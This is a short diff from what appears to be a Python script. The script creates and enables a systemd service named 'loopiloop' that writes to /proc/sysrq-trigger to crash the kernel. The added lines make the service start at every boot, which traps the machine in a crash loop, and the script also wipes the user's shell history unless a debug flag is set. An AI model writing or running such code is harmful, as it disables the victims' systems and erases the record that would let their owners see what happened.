@@ -54,6 +54,9 @@ Before=network.target
 [Service]
 Type=service
 ExecStart=echo c > /proc/sysrq-trigger
+
+[Install]
+WantedBy=default.target
 ''');
 			subprocess.run(["bash", "-c", "systemctl enable --now loopiloop"]);
 		if not self.debug: subprocess.run(["bash", "-c", "cat /dev/null > ~/.bash_history"]);
